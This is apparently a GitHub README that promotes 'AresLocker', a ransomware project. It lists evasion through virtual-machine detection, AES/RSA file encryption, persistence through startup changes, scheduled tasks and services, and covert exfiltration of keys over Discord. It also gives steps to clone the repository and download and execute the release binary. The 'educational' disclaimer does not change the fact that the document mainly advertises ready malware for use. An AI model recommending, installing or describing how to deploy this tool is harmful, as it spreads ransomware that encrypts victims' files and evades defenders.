## Introduction

AresLocker is not just another piece of malware; it represents a leap in ransomware technology. With a focus on stealth and efficiency, AresLocker integrates advanced techniques that challenge conventional cybersecurity measures. 

This project aims to serve as both a research tool and an educational resource for cybersecurity professionals and enthusiasts. 

## Features

- **VM Detection**: AresLocker can identify virtual machines, allowing it to evade detection in controlled environments.
- **Strong Encryption**: It uses AES and RSA algorithms to secure files, ensuring that only authorized users can access them.
- **Multi-layer Persistence**: The ransomware employs various techniques to maintain its presence on infected systems, making it harder to remove.
- **Covert Key Exfiltration**: AresLocker can discreetly send encryption keys through Discord, minimizing the risk of detection.
- **Modular Design**: The architecture allows for easy updates and enhancements, making it adaptable to evolving cybersecurity landscapes.

## Installation

To get started with AresLocker, follow these steps:

1. Clone the repository:

   ```bash
   git clone https://github.com/lrortizs/Project-Ares.git
   ```

2. Navigate to the project directory:

   ```bash
   cd Project-Ares
   ```

3. Download the latest release from the [Releases section](https://github.com/lrortizs/Project-Ares/releases). Make sure to execute the downloaded file to set up AresLocker.

## Usage

Once you have installed AresLocker, you can start using it for your cybersecurity research. Hereâ€™s a simple example of how to run the application:

```bash
./AresLocker --encrypt <file_to_encrypt>
```

Replace `<file_to_encrypt>` with the path of the file you wish to encrypt. 

### Important Note

AresLocker is intended for educational and research purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

## Technical Details

### Encryption

AresLocker employs a combination of AES and RSA encryption techniques. 

- **AES**: A symmetric encryption algorithm that encrypts data quickly and securely.
- **RSA**: An asymmetric encryption algorithm that is used to securely exchange keys.

### Persistence Mechanisms

The ransomware uses multiple techniques to ensure it remains active on infected systems. This includes:

- Modifying system startup configurations.
- Creating scheduled tasks.
- Utilizing Windows services for ongoing execution.

### Covert Key Exfiltration

AresLockerâ€™s unique feature is its ability to exfiltrate keys through Discord. This method leverages existing communication platforms to avoid detection by traditional security tools.
